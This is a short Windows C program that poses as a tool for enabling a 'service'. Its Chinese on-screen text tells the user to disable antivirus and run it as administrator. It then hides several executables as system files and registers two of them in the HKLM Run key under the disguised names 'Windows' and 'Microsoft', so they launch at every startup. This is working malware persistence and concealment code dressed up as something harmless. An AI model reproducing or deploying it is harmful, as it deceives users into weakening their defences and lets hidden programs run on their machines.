#include<windows.h>
#include<stdio.h>
int main()
{
	int i; 
	printf("输入1并按下键盘上的enter键开启服务,开启服务之前记得关闭杀毒软件，不然无法正常添加开机启动项，如果不成功，请以管理员身份运行该程序\n"); 
	scanf("%d",&i);
	if(i==1)
	{
		system("attrib +s +h C:\\开启服务，请以管理员身份运行该程序.exe");
		system("attrib +s +h C:\\windowsapplication_update.exe");
		system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Windows /t REG_SZ /d C:\\windowsapplication_update.exe /f");
		system("attrib +s +h C:\\programprotect.exe");
		system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Microsoft /t REG_SZ /d C:\\programprotect.exe /f");
		printf("开启服务成功，重启电脑生效-by java.lang.nullpointerexpectation:null\n"); 
	}
	else
	{
		printf("开启服务失败！\n"); 
	} 
	system("pause");
	return 0;	
 }
